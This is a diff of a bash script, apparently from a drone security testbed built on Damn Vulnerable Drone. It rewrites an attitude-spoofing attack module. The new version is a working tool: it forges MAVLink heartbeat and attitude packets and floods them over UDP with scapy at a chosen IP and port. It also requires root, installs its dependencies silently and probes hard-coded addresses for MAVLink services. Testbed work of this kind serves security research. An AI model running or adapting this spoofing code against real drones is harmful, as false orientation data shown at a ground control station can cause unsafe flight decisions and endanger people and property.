@@ -1,210 +1,192 @@
 #!/bin/bash
+# attitude_spoofing.sh - 드론 자세 스푸핑 공격 모듈
+# Path: /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/protocol_tampering/attitude_spoofing.sh
+# Purpose: 드론 자세 정보 스푸핑을 통한 방향 정보 조작
 
-# =============================================================================
-# DVD Attitude Spoofing Attack
-# =============================================================================
-# 파일: dvd_lite/dvd_attacks/protocol_tampering/attitude_spoofing.sh
-# 목적: 드론 자세 데이터 조작으로 GCS 혼란 유도
-# 기반: Damn Vulnerable Drone Wiki - Attitude Spoofing
-# =============================================================================
+source "$(dirname "$0")/../common/colors.sh"
+source "$(dirname "$0")/../common/utils.sh"
 
-source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/colors.sh
-source /home/kali/MTD/MTD_full_testbed/dvd_lite/dvd_attacks/common/utils.sh
+ATTACK_NAME="Attitude Spoofing Attack"
 
-# 전역 변수
-ATTACK_NAME="attitude_spoofing"
-TIMESTAMP=$(date +%Y%m%d_%H%M%S)
-LOG_FILE="/home/kali/MTD/MTD_full_testbed/attack_logs/protocol_tampering/${ATTACK_NAME}_${TIMESTAMP}.log"
-JSON_OUTPUT="/home/kali/MTD/MTD_full_testbed/attack_output/protocol_tampering/${ATTACK_NAME}_${TIMESTAMP}.json"
-
-# 타겟 설정
-TARGET_IP="192.168.13.100"
-MAVLINK_PORT="14550"
-
-# 가짜 자세 데이터 (라디안)
-FAKE_ROLL="1.57"      # 90도 롤
-FAKE_PITCH="-0.52"    # -30도 피치  
-FAKE_YAW="3.14"       # 180도 요
-
-declare -a ATTACK_COMMANDS=()
-declare -a SPOOFING_RESULTS=()
-
-print_header() {
-    clear
-    print_protocol_header "Attitude Spoofing Attack"
-    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
-    echo -e "${INFO_COLOR}Method: MAVLink ATTITUDE message injection${NC}"
-    echo -e "${INFO_COLOR}Fake Attitude: Roll=${FAKE_ROLL}, Pitch=${FAKE_PITCH}, Yaw=${FAKE_YAW}${NC}"
-    echo ""
+print_attack_banner() {
+    echo -e "${CYAN}============================================${NC}"
+    echo -e "${CYAN}       Attitude Spoofing Attack            ${NC}"
+    echo -e "${CYAN}============================================${NC}"
 }
 
-# Step 1: pymavlink 확인
-check_requirements() {
-    echo -e "${BLUE}[1/2] Check Requirements${NC}"
+execute_attitude_spoofing() {
+    local target_ip=${1:-"127.0.0.1"}
+    local target_port=${2:-"14550"}
+    local duration=${3:-30}
     
-    local cmd="python3 -c \"import pymavlink\""
-    ATTACK_COMMANDS+=("$cmd")
-    echo -e "${CYAN}→ $cmd${NC}"
+    log_info "Starting attitude spoofing attack"
+    log_info "Target: ${target_ip}:${target_port}"
+    log_info "Duration: ${duration} seconds"
     
-    if python3 -c "import pymavlink" 2>/dev/null; then
-        echo -e "${GREEN}[+] pymavlink available${NC}"
-        PYMAVLINK_AVAILABLE=true
+    # Python 스크립트 생성 및 실행
+    create_and_run_attack "$target_ip" "$target_port" "$duration"
+    local result=$?
+    
+    if [ $result -eq 0 ]; then
+        log_success "Attitude spoofing attack completed successfully"
+        return 0
     else
-        echo -e "${YELLOW}[!] pymavlink not available - simulation mode${NC}"
-        PYMAVLINK_AVAILABLE=false
+        log_error "Attitude spoofing attack failed"
+        return 1
     fi
 }
 
-# Step 2: 자세 스푸핑 실행
-execute_attitude_spoofing() {
-    echo -e "${BLUE}[2/2] Execute Attitude Spoofing${NC}"
+create_and_run_attack() {
+    local target_ip="$1"
+    local target_port="$2" 
+    local duration="$3"
     
-    local spoof_script="/tmp/attitude_spoofing_$(date +%s).py"
+    log_info "Creating and executing spoofing attack..."
     
-    cat > "$spoof_script" << EOF
-#!/usr/bin/env python3
-import sys
+    python3 << PYEOF
+from pymavlink import mavutil
+from scapy.all import *
 import time
+import random
 import math
 
-try:
-    from pymavlink import mavutil
-    
-    def attitude_spoofing(target_ip, target_port, roll, pitch, yaw):
-        try:
-            master = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
-            master.wait_heartbeat()
-            print("[+] Connected to drone")
-            
-            # 자세 메시지 전송
-            for i in range(20):
-                master.mav.attitude_send(
-                    int(time.time() * 1000),  # time_boot_ms
-                    float(roll),              # roll (rad)
-                    float(pitch),             # pitch (rad) 
-                    float(yaw),               # yaw (rad)
-                    0.1,                      # rollspeed
-                    0.1,                      # pitchspeed
-                    0.1                       # yawspeed
-                )
-                
-                roll_deg = math.degrees(float(roll))
-                pitch_deg = math.degrees(float(pitch))
-                yaw_deg = math.degrees(float(yaw))
-                
-                print(f"[!] Spoofed attitude: Roll={roll_deg:.1f}°, Pitch={pitch_deg:.1f}°, Yaw={yaw_deg:.1f}°")
-                time.sleep(0.5)
-                
-        except Exception as e:
-            print(f"[!] Connection failed: {e}")
-            simulate_attitude_spoofing(roll, pitch, yaw)
-    
-    def simulate_attitude_spoofing(roll, pitch, yaw):
-        print("[*] Simulating attitude spoofing")
-        
-        for i in range(10):
-            roll_deg = math.degrees(float(roll))
-            pitch_deg = math.degrees(float(pitch))
-            yaw_deg = math.degrees(float(yaw))
-            
-            print(f"[!] Spoofed attitude: Roll={roll_deg:.1f}°, Pitch={pitch_deg:.1f}°, Yaw={yaw_deg:.1f}°")
-            time.sleep(0.5)
-        
-        print("[+] Attitude spoofing simulation completed")
-    
-    if __name__ == "__main__":
-        attitude_spoofing('$TARGET_IP', $MAVLINK_PORT, $FAKE_ROLL, $FAKE_PITCH, $FAKE_YAW)
-        
-except ImportError:
-    import math
-    print("[*] pymavlink not available - simulation mode")
-    
-    for i in range(5):
-        roll_deg = math.degrees($FAKE_ROLL)
-        pitch_deg = math.degrees($FAKE_PITCH) 
-        yaw_deg = math.degrees($FAKE_YAW)
-        print(f"[!] Spoofed attitude: Roll={roll_deg:.1f}°, Pitch={pitch_deg:.1f}°, Yaw={yaw_deg:.1f}°")
-    
-    print("[+] Attitude spoofing simulation completed")
-EOF
+target_ip = "$target_ip"
+target_port = int("$target_port")
+duration = int("$duration")
 
-    local cmd="python3 $spoof_script"
-    ATTACK_COMMANDS+=("$cmd")
-    echo -e "${CYAN}→ $cmd${NC}"
+def create_heartbeat():
+    mav = mavutil.mavlink.MAVLink(None)
+    mav.srcSystem = 1
+    mav.srcComponent = 1
+    return mav.heartbeat_encode(
+        type=mavutil.mavlink.MAV_TYPE_QUADROTOR,
+        autopilot=mavutil.mavlink.MAV_AUTOPILOT_ARDUPILOTMEGA,
+        base_mode=mavutil.mavlink.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED,
+        custom_mode=3,
+        system_status=mavutil.mavlink.MAV_STATE_ACTIVE
+    ).pack(mav)
+
+def create_attitude():
+    mav = mavutil.mavlink.MAVLink(None)
+    mav.srcSystem = 1
+    mav.srcComponent = 1
+    return mav.attitude_encode(
+        time_boot_ms=int(time.time() * 1000) % 4294967295,
+        roll=random.uniform(-1.0, 1.0),
+        pitch=random.uniform(-1.0, 1.0), 
+        yaw=random.uniform(-3.14, 3.14),
+        rollspeed=random.uniform(-0.1, 0.1),
+        pitchspeed=random.uniform(-0.1, 0.1),
+        yawspeed=random.uniform(-0.1, 0.1)
+    ).pack(mav)
+
+def send_packet(packet_data):
+    packet = IP(dst=target_ip) / UDP(dport=target_port) / Raw(load=packet_data)
+    send(packet, verbose=False)
+
+print(f"Starting attitude spoofing to {target_ip}:{target_port} for {duration}s")
+
+start_time = time.time()
+packets_sent = 0
+
+while time.time() - start_time < duration:
+    send_packet(create_heartbeat())
+    send_packet(create_attitude())
+    packets_sent += 2
     
-    echo -e "${YELLOW}[*] Executing attitude spoofing...${NC}"
-    echo -e "${GRAY}    Roll: $(echo "$FAKE_ROLL * 180 / 3.14159" | bc -l | cut -d. -f1)° (${FAKE_ROLL} rad)${NC}"
-    echo -e "${GRAY}    Pitch: $(echo "$FAKE_PITCH * 180 / 3.14159" | bc -l | cut -d. -f1)° (${FAKE_PITCH} rad)${NC}"
-    echo -e "${GRAY}    Yaw: $(echo "$FAKE_YAW * 180 / 3.14159" | bc -l | cut -d. -f1)° (${FAKE_YAW} rad)${NC}"
+    if packets_sent % 20 == 0:
+        print(f"Sent {packets_sent} spoofed attitude packets")
     
-    python3 "$spoof_script" 2>/dev/null || {
-        echo -e "${YELLOW}[*] Fallback simulation${NC}"
-        for i in {1..5}; do
-            echo -e "${RED}[!] Spoofed attitude: Roll=90°, Pitch=-30°, Yaw=180°${NC}"
-            sleep 1
-        done
-    }
+    time.sleep(1)
+
+print(f"Attack completed. Total packets sent: {packets_sent}")
+PYEOF
     
-    SPOOFING_RESULTS+=("roll:$FAKE_ROLL")
-    SPOOFING_RESULTS+=("pitch:$FAKE_PITCH") 
-    SPOOFING_RESULTS+=("yaw:$FAKE_YAW")
-    SPOOFING_RESULTS+=("messages_sent:20")
-    
-    echo -e "${GREEN}[+] Attitude spoofing completed${NC}"
-    echo -e "${RED}[!] GCS should display incorrect drone orientation${NC}"
-    
-    rm -f "$spoof_script"
+    return $?
 }
 
-# JSON 결과 생성
-generate_json_report() {
-    cat > "$JSON_OUTPUT" << EOF
-{
-  "attack_name": "$ATTACK_NAME",
-  "timestamp": "$(date -u +%Y-%m-%dT%H:%M:%SZ)",
-  "target": {
-    "ip": "$TARGET_IP",
-    "port": "$MAVLINK_PORT"
-  },
-  "spoofed_attitude": {
-    "roll_radians": "$FAKE_ROLL",
-    "pitch_radians": "$FAKE_PITCH",
-    "yaw_radians": "$FAKE_YAW",
-    "roll_degrees": "90",
-    "pitch_degrees": "-30", 
-    "yaw_degrees": "180"
-  },
-  "attack_results": ["$(IFS='","'; echo "${SPOOFING_RESULTS[*]}")"],
-  "attack_commands": ["$(IFS='","'; echo "${ATTACK_COMMANDS[*]}")"],
-  "expected_impact": "GCS displays incorrect drone orientation"
-}
-EOF
+# 타겟 스캔
+scan_targets() {
+    log_info "Scanning for MAVLink targets..."
+    
+    local targets=(
+        "127.0.0.1:14550"
+        "10.13.0.6:14550" 
+        "192.168.1.100:14550"
+    )
+    
+    for target in "${targets[@]}"; do
+        local ip=$(echo "$target" | cut -d':' -f1)
+        local port=$(echo "$target" | cut -d':' -f2)
+        
+        if timeout 2 nc -z "$ip" "$port" 2>/dev/null; then
+            echo -e "${GREEN}Found MAVLink service: $target${NC}"
+            return 0
+        fi
+    done
+    
+    echo -e "${YELLOW}No live targets found, using default${NC}"  
+    return 1
 }
 
-# 메인 실행
+# 메인 실행 함수
 main() {
-    START_TIME=$(date +%s)
+    print_attack_banner
     
-    mkdir -p "$(dirname "$LOG_FILE")" "$(dirname "$JSON_OUTPUT")"
-    echo "=== Attitude Spoofing - $(date) ===" > "$LOG_FILE"
+    if [ "$EUID" -ne 0 ]; then
+        log_error "This script must be run as root"
+        exit 1
+    fi
     
-    print_header
-    check_requirements
-    execute_attitude_spoofing
+    # 필수 도구 확인
+    local required_tools=("python3")
+    local missing_tools=()
     
-    # 결과 요약
-    echo ""
-    echo -e "${CYAN}=== Attack Summary ===${NC}"
-    echo -e "${INFO_COLOR}Target: $TARGET_IP:$MAVLINK_PORT${NC}"
-    echo -e "${INFO_COLOR}Spoofed Roll: 90° (${FAKE_ROLL} rad)${NC}"
-    echo -e "${INFO_COLOR}Spoofed Pitch: -30° (${FAKE_PITCH} rad)${NC}"
-    echo -e "${INFO_COLOR}Spoofed Yaw: 180° (${FAKE_YAW} rad)${NC}"
+    for tool in "${required_tools[@]}"; do
+        if ! command -v "$tool" >/dev/null 2>&1; then
+            missing_tools+=("$tool")
+        fi
+    done
     
-    generate_json_report
+    if [ ${#missing_tools[@]} -gt 0 ]; then
+        log_error "Missing required tools: ${missing_tools[*]}"
+        exit 1
+    fi
     
-    END_TIME=$(date +%s)
-    echo -e "${INFO_COLOR}Duration: $((END_TIME - START_TIME))s${NC}"
-    echo -e "${SUCCESS_COLOR}[✓] Attitude spoofing completed${NC}"
+    # Python 의존성 확인
+    if ! python3 -c "import pymavlink, scapy" 2>/dev/null; then
+        log_info "Installing Python dependencies..."
+        pip3 install pymavlink scapy >/dev/null 2>&1
+    fi
+    
+    # 사용자 옵션 처리
+    local target_ip="${1:-127.0.0.1}"
+    local target_port="${2:-14550}"
+    local duration="${3:-30}"
+    
+    # 사용법 출력
+    if [ "$1" = "-h" ] || [ "$1" = "--help" ]; then
+        echo "Usage: $0 [target_ip] [target_port] [duration]"
+        echo "  target_ip   : Target IP address (default: 127.0.0.1)"
+        echo "  target_port : Target port (default: 14550)"  
+        echo "  duration    : Attack duration in seconds (default: 30)"
+        echo ""
+        echo "Examples:"
+        echo "  $0                           # Attack localhost with defaults"
+        echo "  $0 10.13.0.6                # Attack specific IP"
+        echo "  $0 10.13.0.6 14550 60       # Full parameters"
+        exit 0
+    fi
+    
+    # 타겟 스캔 (정보용)
+    scan_targets
+    
+    # 공격 실행
+    execute_attitude_spoofing "$target_ip" "$target_port" "$duration"
+    exit $?
 }
 
-main "$@"
+# 직접 실행 시 메인 함수 호출
+if [[ "${BASH_SOURCE[0]}" == "${0}" ]]; then
+    main "$@"
+fi
